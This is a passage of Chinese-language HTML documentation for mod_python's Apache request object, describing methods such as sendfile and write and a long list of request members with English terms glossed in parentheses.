0, 0);\">\n<font face=\"Courier New, monospace\"><span lang=\"en-US\"><b>register_cleanup(callable[,data])</b></span></font></p>\n<p align=\"justify\" style=\"margin-bottom: 0cm; text-indent: 1cm; color: rgb(0, 0, 0);\">\n<font face=\"宋体\">注册一个清理行为。参数</font><font face=\"Courier New, monospace\"><span lang=\"en-US\">callable</span></font><font face=\"宋体\">可以为任何可调用对象，可选参数</font><font face=\"Courier New, monospace\"><span lang=\"en-US\">data</span></font><font face=\"宋体\">可以是任何对象，缺省为</font><font face=\"Courier New, monospace\"><span lang=\"en-US\">None</span></font><font face=\"宋体\">。在每个请求结束的时候，而在请求对象被销毁之前，</font><font face=\"Courier New, monospace\"><span lang=\"en-US\">callable</span></font><font face=\"宋体\">将会被调用，并且传递一个唯一的参数</font><font face=\"Courier New, monospace\"><span lang=\"en-US\">data</span></font><font face=\"宋体\">。</font></p>\n<p align=\"justify\" style=\"margin-bottom: 0cm; text-indent: 1cm; color: rgb(0, 0, 0);\">\n<font face=\"宋体\">推荐传递请求对象作为</font><font face=\"Courier New, monospace\"><span lang=\"en-US\">data</span></font><font face=\"宋体\">，但是注意，在执行清理行为时，请求对象的处理已经完成，这时再对客户端进行写操作是无意义的</font><font face=\"Courier New, monospace\"><span lang=\"en-US\">(pointless)</span></font><font face=\"宋体\">。</font></p>\n<p align=\"justify\" style=\"margin-bottom: 0cm; text-indent: 1cm; color: rgb(0, 0, 0);\">\n<font face=\"宋体\">如果在执行清理时遇到</font><font face=\"Courier New, monospace\"><span lang=\"en-US\">(encounter)</span></font><font face=\"宋体\">错误，将会被日志记录。除非直接影响请求处理，否则执行清理中的</font><font face=\"Courier New, monospace\"><span lang=\"en-US\">bug</span></font><font face=\"宋体\">很难辨认</font><font face=\"Courier New, monospace\"><span lang=\"en-US\">(spot)</span></font><font face=\"宋体\">。</font></p>\n<p align=\"justify\" style=\"margin-bottom: 0cm; text-indent: 1cm; color: rgb(0, 0, 0);\">\n<font face=\"宋体\">如果在清理行为之前，服务器关闭了，则很可能不会被执行。</font></p>\n<p align=\"justify\" style=\"margin-bottom: 0cm; text-indent: 1cm; color: rgb(0, 0, 0);\">\n<font face=\"Courier New, monospace\"><span lang=\"en-US\"><b>sendfile(path[,offset,len])</b></span></font></p>\n<p align=\"justify\" style=\"margin-bottom: 0cm; text-indent: 1cm; color: rgb(0, 0, 0);\">\n<font face=\"宋体\">发送</font><font face=\"Courier New, monospace\"><span lang=\"en-US\">path</span></font><font face=\"宋体\">文件到客户端，开始为</font><font face=\"Courier New, monospace\"><span lang=\"en-US\">offset</span></font><font face=\"宋体\">，并发送</font><font face=\"Courier New, monospace\"><span lang=\"en-US\">len</span></font><font face=\"宋体\">字节。</font><font face=\"Courier New, monospace\"><span lang=\"en-US\">offset</span></font><font face=\"宋体\">缺省为</font><font face=\"Courier New, monospace\"><span lang=\"en-US\">0</span></font><font face=\"宋体\">，而</font><font face=\"Courier New, monospace\"><span lang=\"en-US\">len</span></font><font face=\"宋体\">缺省为</font><font face=\"Courier New, monospace\"><span lang=\"en-US\">-1</span></font><font face=\"宋体\">，发送整个</font><font face=\"Courier New, monospace\"><span lang=\"en-US\">(entire)</span></font><font face=\"宋体\">文件。</font></p>\n<p align=\"justify\" style=\"margin-bottom: 0cm; text-indent: 1cm; color: rgb(0, 0, 0);\">\n<font face=\"宋体\">返回成功发送的字节数，或者在出错时抛出</font><font face=\"Courier New, monospace\"><span lang=\"en-US\">IOError</span></font><font face=\"宋体\">异常。这个函数提供了向客户端发送文件的最有效</font><font face=\"Courier New, monospace\"><span lang=\"en-US\">(most\nefficient)</span></font><font face=\"宋体\">的方式。</font></p>\n<p align=\"justify\" style=\"margin-bottom: 0cm; text-indent: 1cm; color: rgb(0, 0, 0);\">\n<font face=\"Courier New, monospace\"><span lang=\"en-US\"><b>write(string[,flush=1])</b></span></font></p>\n<p align=\"justify\" style=\"margin-bottom: 0cm; text-indent: 1cm; color: rgb(0, 0, 0);\">\n<font face=\"宋体\">将字符串立即</font><font face=\"Courier New, monospace\"><span lang=\"en-US\">(directly)</span></font><font face=\"宋体\">写入客户端，然活清空</font><font face=\"Courier New, monospace\"><span lang=\"en-US\">(flush)</span></font><font face=\"宋体\">缓存，除非</font><font face=\"Courier New, monospace\"><span lang=\"en-US\">flush</span></font><font face=\"宋体\">是</font><font face=\"Courier New, monospace\"><span lang=\"en-US\">0</span></font><font face=\"宋体\">。</font></p>\n<p align=\"justify\" style=\"margin-bottom: 0cm; text-indent: 1cm; color: rgb(0, 0, 0);\">\n<font face=\"Courier New, monospace\"><span lang=\"en-US\"><b>flush()</b></span></font></p>\n<p align=\"justify\" style=\"margin-bottom: 0cm; text-indent: 1cm; color: rgb(0, 0, 0);\">\n<font face=\"宋体\">将缓存数据写入客户端，并清空缓存。</font></p>\n<p align=\"justify\" style=\"margin-bottom: 0cm; text-indent: 1cm; color: rgb(0, 0, 0);\">\n<font face=\"Courier New, monospace\"><span lang=\"en-US\"><b>set_content_length(len)</b></span></font></p>\n<p align=\"justify\" style=\"margin-bottom: 0cm; text-indent: 1cm; color: rgb(0, 0, 0);\">\n<font face=\"宋体\">设置</font><font face=\"Courier New, monospace\"><span lang=\"en-US\">req.length</span></font><font face=\"宋体\">和</font><font face=\"Courier New, monospace\"><span lang=\"en-US\">\"Content-length\"</span></font><font face=\"宋体\">头。注意必须在任何发送数据之前设置，比如</font><font face=\"Courier New, monospace\"><span lang=\"en-US\">req.write()</span></font><font face=\"宋体\">之前，否则是无意义的</font><font face=\"Courier New, monospace\"><span lang=\"en-US\">(meaningless)</span></font><font face=\"宋体\">。</font></p>\n<ul><li>\n<p align=\"justify\" style=\"margin-bottom: 0cm; color: rgb(0, 0, 0);\"><font face=\"宋体\"><b>请求对象的成员：</b></font></p>\n</li></ul>\n<p align=\"justify\" style=\"margin-bottom: 0cm; text-indent: 1cm; color: rgb(0, 0, 0);\">\n<font face=\"Courier New, monospace\"><span lang=\"en-US\"><b>connection</b></span></font></p>\n<p align=\"justify\" style=\"margin-bottom: 0cm; text-indent: 1cm; color: rgb(0, 0, 0);\">\n<font face=\"宋体\">这个请求的连接对象。查看后面的详细介绍。只读。</font></p>\n<p align=\"justify\" style=\"margin-bottom: 0cm; text-indent: 1cm; color: rgb(0, 0, 0);\">\n<font face=\"Courier New, monospace\"><span lang=\"en-US\"><b>server</b></span></font></p>\n<p align=\"justify\" style=\"margin-bottom: 0cm; text-indent: 1cm; color: rgb(0, 0, 0);\">\n<font face=\"宋体\">请求所属的服务器对象。查看后面的详细介绍。只读。</font></p>\n<p align=\"justify\" style=\"margin-bottom: 0cm; text-indent: 1cm; color: rgb(0, 0, 0);\">\n<font face=\"Courier New, monospace\"><span lang=\"en-US\"><b>next</b></span></font></p>\n<p align=\"justify\" style=\"margin-bottom: 0cm; text-indent: 1cm; color: rgb(0, 0, 0);\">\n<font face=\"宋体\">如果是内部重定向，重定向到的请求对象。只读。</font></p>\n<p align=\"justify\" style=\"margin-bottom: 0cm; text-indent: 1cm; color: rgb(0, 0, 0);\">\n<font face=\"Courier New, monospace\"><span lang=\"en-US\"><b>prev</b></span></font></p>\n<p align=\"justify\" style=\"margin-bottom: 0cm; text-indent: 1cm; color: rgb(0, 0, 0);\">\n<font face=\"宋体\">如果是内部重定向，来自重定向的请求对象。只读。</font></p>\n<p align=\"justify\" style=\"margin-bottom: 0cm; text-indent: 1cm; color: rgb(0, 0, 0);\">\n<font face=\"Courier New, monospace\"><span lang=\"en-US\"><b>main</b></span></font></p>\n<p align=\"justify\" style=\"margin-bottom: 0cm; text-indent: 1cm; color: rgb(0, 0, 0);\">\n<font face=\"宋体\">如果这是一个子请求，指向主请求。只读。</font></p>\n<p align=\"justify\" style=\"margin-bottom: 0cm; text-indent: 1cm; color: rgb(0, 0, 0);\">\n<font face=\"Courier New, monospace\"><span lang=\"en-US\"><b>the_request</b></span></font></p>\n<p align=\"justify\" style=\"margin-bottom: 0cm; text-indent: 1cm; color: rgb(0, 0, 0);\">\n<font face=\"宋体\">包含请求的第一行的字符串。只读。</font></p>\n<p align=\"justify\" style=\"margin-bottom: 0cm; text-indent: 1cm; color: rgb(0, 0, 0);\">\n<font face=\"Courier New, monospace\"><span lang=\"en-US\"><b>assbackwards</b></span></font></p>\n<p align=\"justify\" style=\"margin-bottom: 0cm; text-indent: 1cm; color: rgb(0, 0, 0);\">\n<font face=\"宋体\">指定</font><font face=\"Courier New, monospace\"><span lang=\"en-US\">HTTP/0.9</span></font><font face=\"宋体\">的简单请求。这意味着响应不包含任何头，仅包含信息主体。用于兼容古老的浏览器。也可以指定这个选项用于在重定向中避免</font><font face=\"Courier New, monospace\"><span lang=\"en-US\">(avoid)</span></font><font face=\"宋体\">发送头。</font></p>\n<p align=\"justify\" style=\"margin-bottom: 0cm; text-indent: 1cm; color: rgb(0, 0, 0);\">\n<font face=\"Courier New, monospace\"><span lang=\"en-US\"><b>proxyreq</b></span></font></p>\n<p align=\"justify\" style=\"margin-bottom: 0cm; text-indent: 1cm; color: rgb(0, 0, 0);\">\n<font face=\"宋体\">代理请求。一个</font><font face=\"Courier New, monospace\"><span lang=\"en-US\">apache.PROXYREQ_*</span></font><font face=\"宋体\">值。只读。</font></p>\n<p align=\"justify\" style=\"margin-bottom: 0cm; text-indent: 1cm; color: rgb(0, 0, 0);\">\n<font face=\"Courier New, monospace\"><span lang=\"en-US\"><b>header_only</b></span></font></p>\n<p align=\"justify\" style=\"margin-bottom: 0cm; text-indent: 1cm; color: rgb(0, 0, 0);\">\n<font face=\"宋体\">指定</font><font face=\"Courier New, monospace\"><span lang=\"en-US\">HEAD</span></font><font face=\"宋体\">请求的布尔变量，反对</font><font face=\"Courier New, monospace\"><span lang=\"en-US\">GET</span></font><font face=\"宋体\">。只读。</font></p>\n<p align=\"justify\" style=\"margin-bottom: 0cm; text-indent: 1cm; color: rgb(0, 0, 0);\">\n<font face=\"Courier New, monospace\"><span lang=\"en-US\"><b>protocol</b></span></font></p>\n<p align=\"justify\" style=\"margin-bottom: 0cm; text-indent: 1cm; color: rgb(0, 0, 0);\">\n<font face=\"宋体\">客户端提供的协议，或者是</font><font face=\"Courier New, monospace\"><span lang=\"en-US\">\'HTTP/0.9\'</span></font><font face=\"宋体\">。同</font><font face=\"Courier New, monospace\"><span lang=\"en-US\">CGI SERVER_PROTOCOL</span></font><font face=\"宋体\">。只读。</font></p>\n<p align=\"justify\" style=\"margin-bottom: 0cm; text-indent: 1cm; color: rgb(0, 0, 0);\">\n<font face=\"Courier New, monospace\"><span lang=\"en-US\"><b>proto_num</b></span></font></p>\n<p align=\"justify\" style=\"margin-bottom: 0cm; text-indent: 1cm; color: rgb(0, 0, 0);\">\n<font face=\"宋体\">整数，协议版本号，比如</font><font face=\"Courier New, monospace\"><span lang=\"en-US\">1.1</span></font><font face=\"宋体\">对应</font><font face=\"Courier New, monospace\"><span lang=\"en-US\">1001</span></font><font face=\"宋体\">。只读。</font></p>\n<p align=\"justify\" style=\"margin-bottom: 0cm; text-indent: 1cm; color: rgb(0, 0, 0);\">\n<font face=\"Courier New, monospace\"><span lang=\"en-US\"><b>hostname</b></span></font></p>\n<p align=\"justify\" style=\"margin-bottom: 0cm; text-indent: 1cm; color: rgb(0, 0, 0);\">\n<font face=\"宋体\">字符串，由</font><font face=\"Courier New, monospace\"><span lang=\"en-US\">URI</span></font><font face=\"宋体\">或</font><font face=\"Courier New, monospace\"><span lang=\"en-US\">Host:</span></font><font face=\"宋体\">设置，头。只读。</font></p>\n<p align=\"justify\" style=\"margin-bottom: 0cm; text-indent: 1cm; color: rgb(0, 0, 0);\">\n<font face=\"Courier New, monospace\"><span lang=\"en-US\"><b>request_time</b></span></font></p>\n<p align=\"justify\" style=\"margin-bottom: 0cm; text-indent: 1cm; color: rgb(0, 0, 0);\">\n<font face=\"宋体\">长整数，请求发生的时间。只读。</font></p>\n<p align=\"justify\" style=\"margin-bottom: 0cm; text-indent: 1cm; color: rgb(0, 0, 0);\">\n<font face=\"Courier New, monospace\"><span lang=\"en-US\"><b>status_line</b></span></font></p>\n<p align=\"justify\" style=\"margin-bottom: 0cm; text-indent: 1cm; color: rgb(0, 0, 0);\">\n<font face=\"宋体\">状态行，如</font><font face=\"Courier New, monospace\"><span lang=\"en-US\">\'200\nOK\'</span></font><font face=\"宋体\">。只读。</font></p>\n<p align=\"justify\" style=\"margin-bottom: 0cm; text-indent: 1cm; color: rgb(0, 0, 0);\">\n<font face=\"Courier New, monospace\"><span lang=\"en-US\"><b>status</b></span></font></p>\n<p align=\"justify\" style=\"margin-bottom: 0cm; text-indent: 1cm; color: rgb(0, 0, 0);\">\n<font face=\"宋体\">状态，</font><font face=\"Courier New, monospace\"><span lang=\"en-US\">apache.HTTP_*</span></font><font face=\"宋体\">中的一个值。</font></p>\n<p align=\"justify\" style=\"margin-bottom: 0cm; text-indent: 1cm; color: rgb(0, 0, 0);\">\n<font face=\"Courier New, monospace\"><span lang=\"en-US\"><b>method</b></span></font></p>\n<p align=\"justify\" style=\"margin-bottom: 0cm; text-indent: 1cm; color: rgb(0, 0, 0);\">\n<font face=\"宋体\">包含方法的字符串，如</font><font face=\"Courier New, monospace\"><span lang=\"en-US\">\'GET\'</span></font><font face=\"宋体\">，</font><font face=\"Courier New, monospace\"><span lang=\"en-US\">\'HEAD\'</span></font><font face=\"宋体\">，</font><font face=\"Courier New, monospace\"><span lang=\"en-US\">\'POST\'</span></font><font face=\"宋体\">。同</font><font face=\"Courier New, monospace\"><span lang=\"en-US\">CGI\nREQUEST_METHOD</span></font><font face=\"宋体\">。只读。</font></p>\n<p align=\"justify\" style=\"margin-bottom: 0cm; text-indent: 1cm; color: rgb(0, 0, 0);\">\n<font face=\"Courier New, monospace\"><span lang=\"en-US\"><b>method_number</b></span></font></p>\n<p align=\"justify\" style=\"margin-bottom: 0cm; text-indent: 1cm; color: rgb(0, 0, 0);\">\n<font face=\"宋体\">方法号，整数。只读。</font></p>\n<p align=\"justify\" style=\"margin-bottom: 0cm; text-indent: 1cm; color: rgb(0, 0, 0);\">\n<font face=\"Courier New, monospace\"><span lang=\"en-US\"><b>allowed</b></span></font></p>\n<p align=\"justify\" style=\"margin-bottom: 0cm; text-indent: 1cm; color: rgb(0, 0, 0);\">\n<font face=\"宋体\">整数，允许方法的位逻辑。使用允许结构：头响应</font><font face=\"Courier New, monospace\"><span lang=\"en-US\">HTTP_METHOD_NOT_ALLOWED</span></font><font face=\"宋体\">或</font><font face=\"Courier New, monospace\"><span lang=\"en-US\">HTTP_NOT_IMPLEMENTED</span></font><font face=\"宋体\">。这个字段是</font><font face=\"Courier New, monospace\"><span lang=\"en-US\">apache</span></font><font face=\"宋体\">内部使用的。需要设置则使用</font><font face=\"Courier New, monospace\"><span lang=\"en-US\"><font color=\"#0000ff\">req.allow_methods()</font></span></font><font face=\"宋体\">方法。只读。</font></p>\n<p align=\"justify\" style=\"margin-bottom: 0cm; text-indent: 1cm; color: rgb(0, 0, 0);\">\n<font face=\"Courier New, monospace\"><span lang=\"en-US\"><b>allowed_xmethods</b></span></font></p>\n<p align=\"justify\" style=\"margin-bottom: 0cm; text-indent: 1cm; color: rgb(0, 0, 0);\">\n<font face=\"宋体\">元组，允许的扩展</font><font face=\"Courier New, monospace\"><span lang=\"en-US\">(extension)</span></font><font face=\"宋体\">方法。只读。</font></p>\n<p align=\"justify\" style=\"margin-bottom: 0cm; text-indent: 1cm; color: rgb(0, 0, 0);\">\n<font face=\"Courier New, monospace\"><span lang=\"en-US\"><b>allowed_methods</b></span></font></p>\n<p align=\"justify\" style=\"margin-bottom: 0cm; text-indent: 1cm; color: rgb(0, 0, 0);\">\n<font face=\"宋体\">元组，允许的方法，使用</font><font face=\"Courier New, monospace\"><span lang=\"en-US\">METHOD_NOT_ALLOWED</span></font><font face=\"宋体\">的关系。这个成员无法被</font><font face=\"Courier New, monospace\"><span lang=\"en-US\">req.allow_methods()</span></font><font face=\"宋体\">方法修改。只读。</font></p>\n<p align=\"justify\" style=\"margin-bottom: 0cm; text-indent: 1cm; color: rgb(0, 0, 0);\">\n<font face=\"Courier New, monospace\"><span lang=\"en-US\"><b>sent_bodyct</b></span></font></p>\n<p align=\"justify\" style=\"margin-bottom: 0cm; text-indent: 1cm; color: rgb(0, 0, 0);\">\n<font face=\"宋体\">整数，正文的字节数。只读。</font></p>\n<p align=\"justify\" style=\"margin-bottom: 0cm; text-indent: 1cm; color: rgb(0, 0, 0);\">\n<font face=\"Courier New, monospace\"><span lang=\"en-US\"><b>bytes_sent</b></span></font></p>\n<p align=\"justify\" style=\"margin-bottom: 0cm; text-indent: 1cm; color: rgb(0, 0, 0);\">\n<font face=\"宋体\">长整数，已经发送的字节数。只读。</font></p>\n<p align=\"justify\" style=\"margin-bottom: 0cm; text-indent: 1cm; color: rgb(0, 0, 0);\">\n<font face=\"Courier New, monospace\"><span lang=\"en-US\"><b>mtime</b></span></font></p>\n<p align=\"justify\" style=\"margin-bottom: 0cm; text-indent: 1cm; color: rgb(0, 0, 0);\">\n<font face=\"宋体\">长整数，资源的修改时间。只读。</font></p>\n<p align=\"justify\" style=\"margin-bottom: 0cm; text-indent: 1cm; color: rgb(0, 0, 0);\">\n<font face=\"Courier New, monospace\"><span lang=\"en-US\"><b>chunked</b></span></font></p>\n<p align=\"justify\" style=\"margin-bottom: 0cm; text-indent: 1cm; color: rgb(0, 0, 0);\">\n<font face=\"宋体\">传送大块数据时的编码，布尔值。只读。</font></p>\n<p align=\"justify\" style=\"margin-bottom: 0cm; text-indent: 1cm; color: rgb(0, 0, 0);\">\n<font face=\"Courier New, monospace\"><span lang=\"en-US\"><b>range</b></span></font></p>\n<p align=\"justify\" style=\"margin-bottom: 0cm; text-indent: 1cm; color: rgb(0, 0, 0);\">\n<font face=\"宋体\">字符串</font><font face=\"Courier New, monospace\"><span lang=\"en-US\">\'Range:\'</span></font><font face=\"宋体\">头。只读。</font></p>\n<p align=\"justify\" style=\"margin-bottom: 0cm; text-indent: 1cm; color: rgb(0, 0, 0);\">\n<font face=\"Courier New, monospace\"><span lang=\"en-US\"><b>clength</b></span></font></p>\n<p align=\"justify\" style=\"margin-bottom: 0cm; text-indent: 1cm; color: rgb(0, 0, 0);\">\n<font face=\"宋体\">长整数，真正的正文长度。只读。</font></p>\n<p align=\"justify\" style=\"margin-bottom: 0cm; text-indent: 1cm; color: rgb(0, 0, 0);\">\n<font face=\"Courier New, monospace\"><span lang=\"en-US\"><b>remaining</b></span></font></p>\n<p align=\"justify\" style=\"margin-bottom: 0cm; text-indent: 1cm; color: rgb(0, 0, 0);\">\n<font face=\"宋体\">长整数，等待读取的数据字节数，只在一个读取操作中有效，只读。</font></p>\n<p align=\"justify\" style=\"margin-bottom: 0cm; text-indent: 1cm; color: rgb(0, 0, 0);\">\n<font face=\"Courier New, monospace\"><span lang=\"en-US\"><b>read_length</b></span></font></p>\n<p align=\"justify\" style=\"margin-bottom: 0cm; text-indent: 1cm; color: rgb(0, 0, 0);\">\n<font face=\"宋体\">长整数，已经读取的字节数，只读。</font></p>\n<p align=\"justify\" style=\"margin-bottom: 0cm; text-indent: 1cm; color: rgb(0, 0, 0);\">\n<font face=\"Courier New, monospace\"><span lang=\"en-US\"><b>read_body</b></span></font></p>\n<p align=\"justify\" style=\"margin-bottom: 0cm; text-indent: 1cm; color: rgb(0, 0, 0);\">\n<font face=\"宋体\">整数，请求体怎样被读取，只读。</font></p>\n<p align=\"justify\" style=\"margin-bottom: 0cm; text-indent: 1cm; color: rgb(0, 0, 0);\">\n<font face=\"Courier New, monospace\"><span lang=\"en-US\"><b>read_chunked</b></span></font></p>\n<p align=\"justify\" style=\"margin-bottom: 0cm; text-indent: 1cm; color: rgb(0, 0, 0);\">\n<font face=\"宋体\">布尔值，读取大块数据的编码。只读。</font></p>\n<p align=\"justify\" style=\"margin-bottom: 0cm; text-indent: 1cm; color: rgb(0, 0, 0);\">\n<font face=\"Courier New, monospace\"><span lang=\"en-US\"><b>expecting_100</b></span></font></p>\n<p align=\"justify\" style=\"margin-bottom: 0cm; text-indent: 1cm; color: rgb(0, 0, 0);\">\n<font face=\"宋体\">布尔值，是否客户端需要等待</font><font face=\"Courier New, monospace\"><span lang=\"en-US\">100(HTTP_CONTINUE)</span></font><font face=\"宋体\">响应，只读。</font></p>\n<p align=\"justify\" style=\"margin-bottom: 0cm; text-indent: 1cm; color: rgb(0, 0, 0);\">\n<font face=\"Courier New, monospace\"><span lang=\"en-US\"><b>headers_in</b></span></font></p>\n<p align=\"justify\" style=\"margin-bottom: 0cm; text-indent: 1cm; color: rgb(0, 0, 0);\">\n<font face=\"宋体\">客户端发来的头的表格对象。</font></p>\n<p align=\"justify\" style=\"margin-bottom: 0cm; text-indent: 1cm; color: rgb(0, 0, 0);\">\n<font face=\"Courier New, monospace\"><span lang=\"en-US\"><b>headers_out</b></span></font></p>\n<p align=\"justify\" style=\"margin-bottom: 0cm; text-indent: 1cm; color: rgb(0, 0, 0);\">\n<font face=\"宋体\">需要发送给客户端的头的表格对象。</font></p>\n<p align=\"justify\" style=\"margin-bottom: 0cm; text-indent: 1cm; color: rgb(0, 0, 0);\">\n<font face=\"Courier New, monospace\"><span lang=\"en-US\"><b>err_headers_out</b></span></font></p>\n<p align=\"justify\" style=\"margin-bottom: 0cm; text-indent: 1cm; color: rgb(0, 0, 0);\">\n<font face=\"宋体\">当出错时需要发送的头的表格对象，用于出错时替换</font><font face=\"Courier New, monospace\"><span lang=\"en-US\">headers_out</span></font><font face=\"宋体\">。</font></p>\n<p align=\"justify\" style=\"margin-bottom: 0cm; text-indent: 1cm; color: rgb(0, 0, 0);\">\n<font face=\"Courier New, monospace\"><span lang=\"en-US\"><b>subprocess_env</b></span></font></p>\n<p align=\"justify\" style=\"margin-bottom: 0cm; text-indent: 1cm; color: rgb(0, 0, 0);\">\n<font face=\"宋体\">包含</font><font face=\"Courier New, monospace\"><span lang=\"en-US\">CGI</span></font><font face=\"宋体\">信息的表格对象。在需要信息之前需要先调用</font><font face=\"Courier New, monospace\"><span lang=\"en-US\">req.add_common_vars()</span></font><font face=\"宋体\">方法来填充信息。</font></p>\n<p align=\"justify\" style=\"margin-bottom: 0cm; text-indent: 1cm; color: rgb(0, 0, 0);\">\n<font face=\"Courier New, monospace\"><span lang=\"en-US\"><b>notes</b></span></font></p>\n<p align=\"justify\" style=\"margin-bottom: 0cm; text-indent: 1cm; color: rgb(0, 0, 0);\">\n<font face=\"宋体\">与请求拥有共同生存期的对象，用于存储各种信息，可以在一个请求的各个处理器之间传递信息。如果确实需要在各个处理器之间传递信息，最好的方式是给请求对象添加成员。</font></p>\n<p align=\"justify\" style=\"margin-bottom: 0cm; text-indent: 1cm; color: rgb(0, 0, 0);\">\n<font face=\"Courier New, monospace\"><span lang=\"en-US\"><b>phase</b></span></font></p>\n<p align=\"justify\" style=\"margin-bottom: 0cm; text-indent: 1cm; color: rgb(0, 0, 0);\">\n<font face=\"宋体\">正在处理的阶段，比如</font><font face=\"Courier New, monospace\"><span lang=\"en-US\">\'PythonHandler\'</span></font><font face=\"宋体\">，只读。</font></p>\n<p align=\"justify\" style=\"margin-bottom: 0cm; text-indent: 1cm; color: rgb(0, 0, 0);\">\n<font face=\"Courier New, monospace\"><span lang=\"en-US\"><b>interpreter</b></span></font></p>\n<p align=\"justify\" style=\"margin-bottom: 0cm; text-indent: 1cm; color: rgb(0, 0, 0);\">\n<font face=\"宋体\">正在运行的子解释器名。</font></p>\n<p align=\"justify\" style=\"margin-bottom: 0cm; text-indent: 1cm; color: rgb(0, 0, 0);\">\n<font face=\"Courier New, monospace\"><span lang=\"en-US\"><b>content_type</b></span></font></p>\n<p align=\"justify\" style=\"margin-bottom: 0cm; text-indent: 1cm; color: rgb(0, 0, 0);\">\n<font face=\"宋体\">字符串，正文类型。</font><font face=\"Courier New, monospace\"><span lang=\"en-US\">mod_python</span></font><font face=\"宋体\">维护一个内部标志</font><font face=\"Courier New, monospace\"><span lang=\"en-US\"><font color=\"#0000ff\">(req._content_type_set)</font></span></font><font face=\"宋体\">来保持</font><font face=\"Courier New, monospace\"><span lang=\"en-US\">content_type</span></font><font face=\"宋体\">的设置。发布器按照如下方式使用这个标志：当</font><font face=\"Courier New, monospace\"><span lang=\"en-US\">content_type</span></font><font face=\"宋体\">没有明确</font><font face=\"Courier New, monospace\"><span lang=\"en-US\">(explicitly)</span></font><font face=\"宋体\">的设置时，它依靠输出的前几个字节来猜测</font><font face=\"Courier New, monospace\"><span lang=\"en-US\">(attempt)</span></font><font face=\"宋体\">。</font></p>\n<p align=\"justify\" style=\"margin-bottom: 0cm; text-indent: 1cm; color: rgb(0, 0, 0);\">\n<font face=\"Courier New, monospace\"><span lang=\"en-US\"><b>content_languages</b></span></font></p>\n<p align=\"justify\" style=\"margin-bottom: 0cm; text-indent: 1cm; color: rgb(0, 0, 0);\">\n<font face=\"宋体\">元组。用字符串列表表示正文的语言。</font></p>\n<p align=\"justify\" style=\"margin-bottom: 0cm; text-indent: 1cm; color: rgb(0, 0, 0);\">\n<font face=\"Courier New, monospace\"><span lang=\"en-US\"><b>handler</b></span></font></p>\n<p align=\"justify\" style=\"margin-bottom: 0cm; text-indent: 1cm; color: rgb(0, 0, 0);\">\n<font face=\"宋体\">当前处理器的名字。由</font><font face=\"Courier New, monospace\"><span lang=\"en-US\">mod_mime</span></font><font face=\"宋体\">设置，而不是</font><font face=\"Courier New, monospace\"><span lang=\"en-US\">mod_python</span></font><font face=\"宋体\">处理器。大多数情况还是</font><font face=\"Courier New, monospace\"><span lang=\"en-US\">\'mod_python\'</span></font><font face=\"宋体\">，只读。</font></p>\n<p align=\"justify\" style=\"margin-bottom: 0cm; text-indent: 1cm; color: rgb(0, 0, 0);\">\n<font face=\"Courier New, monospace\"><span lang=\"en-US\"><b>content_encoding</b></span></font></p>\n<p align=\"justify\" style=\"margin-bottom: 0cm; text-indent: 1cm; color: rgb(0, 0, 0);\">\n<font face=\"宋体\">字符串，正文编码，只读。</font></p>\n<p align=\"justify\" style=\"margin-bottom: 0cm; text-indent: 1cm; color: rgb(0, 0, 0);\">\n<font face=\"Courier New, monospace\"><span lang=\"en-US\"><b>vlist_validator</b></span></font></p>\n<p align=\"justify\" style=\"margin-bottom: 0cm; text-indent: 1cm; color: rgb(0, 0, 0);\">\n<font face=\"宋体\">整数，有效变量的列表</font><font face=\"Courier New, monospace\"><span lang=\"en-US\">(</span></font><font face=\"宋体\">如果为负数</font><font face=\"Courier New, monospace\"><span lang=\"en-US\">)</span></font><font face=\"宋体\">，只读。</font></p>\n<p align=\"justify\" style=\"margin-bottom: 0cm; text-indent: 1cm; color: rgb(0, 0, 0);\">\n<font face=\"Courier New, monospace\"><span lang=\"en-US\"><b>user</b></span></font></p>\n<p align=\"justify\" style=\"margin-bottom: 0cm; text-indent: 1cm; color: rgb(0, 0, 0);\">\n<font face=\"宋体\">获取验证的用户名。同</font><font face=\"Courier New, monospace\"><span lang=\"en-US\">CGI\nREMOTE_USER</span></font><font face=\"宋体\">，只读。注意，</font><font face=\"Courier New, monospace\"><span lang=\"en-US\">req.get_basic_auth_pw()</span></font><font face=\"宋体\">必须在此之前调用</font><font face=\"Courier New, monospace\"><span lang=\"en-US\">(be called prior)</span></font><font face=\"宋体\">。</font></p>\n<p align=\"justify\" style=\"margin-bottom: 0cm; text-indent: 1cm; color: rgb(0, 0, 0);\">\n<font face=\"Courier New, monospace\"><span lang=\"en-US\"><b>ap_auth_type</b></span></font></p>\n<p align=\"justify\" style=\"margin-bottom: 0cm; text-indent: 1cm; color: rgb(0, 0, 0);\">\n<font face=\"宋体\">验证类型，同</font><font face=\"Courier New, monospace\"><span lang=\"en-US\">CGI\nAUTH_TYPE</span></font><font face=\"宋体\">，只读。</font></p>\n<p align=\"justify\" style=\"margin-bottom: 0cm; text-indent: 1cm; color: rgb(0, 0, 0);\">\n<font face=\"Courier New, monospace\"><span lang=\"en-US\"><b>no_cache</b></span></font></p>\n<p align=\"justify\" style=\"margin-bottom: 0cm; text-indent: 1cm; color: rgb(0, 0, 0);\">\n<font face=\"宋体\">布尔值，如果为</font><font face=\"Courier New, monospace\"><span lang=\"en-US\">true</span></font><font face=\"宋体\">则没有缓存，只读。</font></p>\n<p align=\"justify\" style=\"margin-bottom: 0cm; text-indent: 1cm; color: rgb(0, 0, 0);\">\n<font face=\"Courier New, monospace\"><span lang=\"en-US\"><b>no_local_copy</b></span></font></p>\n<p align=\"justify\" style=\"margin-bottom: 0cm; text-indent: 1cm; color: rgb(0, 0, 0);\">\n<font face=\"宋体\">布尔值，如果没有本地副本，只读。</font></p>\n<p align=\"justify\" style=\"margin-bottom: 0cm; text-indent: 1cm; color: rgb(0, 0, 0);\">\n<font face=\"Courier New, monospace\"><span lang=\"en-US\"><b>unparsed_uri</b></span></font></p>\n<p align=\"justify\" style=\"margin-bottom: 0cm; text-indent: 1cm; color: rgb(0, 0, 0);\">\n<font face=\"Courier New, monospace\"><span lang=\"en-US\">URI</span></font><font face=\"宋体\">没有经过任何转换，只读。</font></p>\n<p align=\"justify\" style=\"margin-bottom: 0cm; text-indent: 1cm; color: rgb(0, 0, 0);\">\n<font face=\"Courier New, monospace\"><span lang=\"en-US\"><b>uri</b></span></font></p>\n<p align=\"justify\" style=\"margin-bottom: 0cm; text-indent: 1cm; color: rgb(0, 0, 0);\">\n<font face=\"Courier New, monospace\"><span lang=\"en-US\">URI</span></font><font face=\"宋体\">的一部分路径，只读。</font></p>\n<p align=\"justify\" style=\"margin-bottom: 0cm; text-indent: 1cm; color: rgb(0, 0, 0);\">\n<font face=\"Courier New, monospace\"><span lang=\"en-US\"><b>filename</b></span></font></p>\n<p align=\"justify\" 